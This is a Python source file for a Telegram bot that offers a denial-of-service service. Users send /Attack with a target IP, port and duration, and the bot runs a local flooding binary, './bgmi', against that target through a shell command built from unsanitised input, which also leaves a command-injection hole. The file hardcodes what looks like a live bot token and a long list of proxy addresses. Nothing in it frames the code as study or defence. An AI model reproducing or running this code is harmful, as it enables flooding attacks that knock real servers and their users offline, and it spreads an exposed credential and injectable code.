import os
import telebot
import logging
import asyncio
from threading import Thread
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '7672123405:AAHeiE6hZPaYDGtLeVGONzp_j_D6WWTW3vQ'
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
proxy_list = ["https://139.162.78.109:8080","https://185.105.90.88:4444","https://45.92.177.60:8080","https://185.105.88.63:4444","https://185.217.199.176:4444","https://185.232.169.108:4444","https://183.215.23.242:9091","https://84.252.74.190:4444","https://34.172.92.211:3128","https://123.30.154.171:7777","https://43.134.68.153:3128","https://80.249.112.162:80","https://152.26.229.93:9443","https://84.252.75.136:4444","https://31.43.52.216:41890","https://23.247.136.245:80","https://5.189.130.42:23055","https://103.126.148.24:8080","https://116.111.113.244:10004","https://222.167.152.58:8380","https://152.26.229.83:9443","https://152.26.229.57:9443","https://141.98.153.86:80","https://121.234.57.63:9002","https://5.161.219.13:4228","https://202.61.206.250:8888","https://84.252.73.132:4444","https://160.86.242.23:8080","https://185.191.236.162:3128","https://185.105.91.62:4444","https://112.198.200.136:8082","https://183.234.215.11:8443","https://54.38.70.138:80","https://61.129.2.212:8080","https://152.26.231.86:9443","https://152.26.229.46:9443","https://58.20.248.139:9002","https://91.229.118.104:3128","https://111.1.61.53:3128","https://185.105.89.249:4444","https://154.64.226.138:80","https://152.26.231.42:9443","https://47.91.104.88:3128","https://14.199.30.127:80","https://65.108.207.6:80","https://154.16.146.41:80","https://152.228.154.20:80","https://125.77.25.178:8090","https://154.236.168.176:1981","https://198.49.68.80:80","https://177.37.217.45:8080","https://199.195.253.213:3128","https://101.128.82.150:8181","https://103.86.109.38:80","https://171.244.60.55:8080","https://36.91.115.133:80","https://152.26.231.83:9443","https://47.89.184.18:3128","https://152.32.176.241:8443","https://152.26.229.42:9443","https://140.227.204.70:3128","https://152.26.231.77:9443","https://103.90.67.35:8080","https://109.236.83.153:8888","https://152.26.231.93:9443","https://103.49.202.252:80","https://57.128.169.167:3128","https://209.141.58.24:80","https://152.26.229.34:9443","https://5.161.115.29:51111","https://177.67.86.96:999","https://165.232.129.150:80","https://152.26.229.47:9443","https://45.9.75.76:4444","https://112.3.21.226:8060","https://135.181.154.225:80","https://38.156.236.162:999","https://41.33.14.235:1981","https://152.26.229.86:9443","https://209.121.164.50:31147","https://38.156.235.37:999","https://41.222.8.254:8082","https://103.163.175.29:8080","https://178.48.68.61:18080","https://195.66.93.188:3128","https://162.223.90.130:80","https://152.26.231.22:9443","https://45.224.149.243:999","https://185.217.198.121:4444","https://50.62.183.223:80","https://5.28.35.226:9812","https://190.103.177.131:80","https://209.14.118.161:999","https://81.31.234.70:80","https://202.188.211.11:800","https://117.54.114.33:80","https://192.140.42.83:31511","https://103.178.21.73:8090","https://103.69.106.183:8181","https://126.209.16.218:8082","https://117.54.114.103:80","https://117.54.114.102:80","https://103.175.202.33:8090","https://45.188.164.48:999","https://187.94.220.85:8080","https://122.160.30.99:80","https://58.220.95.66:11143","https://103.187.162.75:8080","https://103.253.103.50:80","https://189.50.9.30:8080","https://186.250.29.225:8080","https://206.237.98.213:799","https://115.127.139.91:58080","https://143.47.237.70:3128","https://167.86.96.187:3128","https://172.104.166.155:8181","https://103.189.112.2:3125","https://103.191.250.66:8083","https://49.0.3.125:7777","https://87.248.129.26:80","https://104.129.192.170:10878","https://58.147.171.110:8085","https://133.232.81.141:80","https://202.51.106.229:8080","https://103.179.252.76:8181","https://103.234.28.50:9091","https://102.211.145.111:8080","https://200.24.146.95:999","https://103.24.212.250:8082","https://80.13.43.193:80","https://38.54.6.39:312","https://103.83.97.46:7777"
]

# Async I/O loop
async def start_asyncio_loop():
    try:
        while True:
            await asyncio.sleep(1)
    except Exception as e:
        logging.error(f"Error in asyncio loop: {e}")

async def run_attack_command_async(target_ip, target_port, duration, message):
    try:
        # Start the attack process
        process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 100")

        await process.communicate()
        
        # Attack completed message
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=message.message_id,
            text=f"*Attack completed successfully! 🎉*\n\n"
                 f"*Host:* {target_ip}\n"
                 f"*Port:* {target_port}\n"
                 f"*Duration:* {duration} seconds\n\n"
                 f"Thank you for your patience! 😊",
            parse_mode='Markdown'
        )
    except Exception as e:
        logging.error(f"Error running attack command: {e}")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    chat_id = message.chat.id
    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: /Attack target_ip target_port time*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        # Send the initial message and update it during the attack
        msg = bot.send_message(message.chat.id, f"*Attack started...*\n\n*Host:* {target_ip}\n*Port:* {target_port}\n*Duration:* {duration} seconds", parse_mode='Markdown')
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration, msg), loop)
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    try:
        # Create a markup object with only the Attack option
        markup = ReplyKeyboardMarkup(row_width=1, resize_keyboard=True, one_time_keyboard=True)
        btn1 = KeyboardButton("Attack")
        markup.add(btn1)

        bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error sending welcome message: {e}")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    try:
        if message.text == "Attack":
            bot.reply_to(message, "*Attack command starting...*", parse_mode='Markdown')
            attack_command(message)
        else:
            bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in handling message: {e}")

if __name__ == "__main__":
    try:
        asyncio_thread = Thread(target=lambda: loop.run_until_complete(start_asyncio_loop()))
        asyncio_thread.start()

        # Start polling to process Telegram bot updates
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        logging.error(f"Error in main thread: {e}")
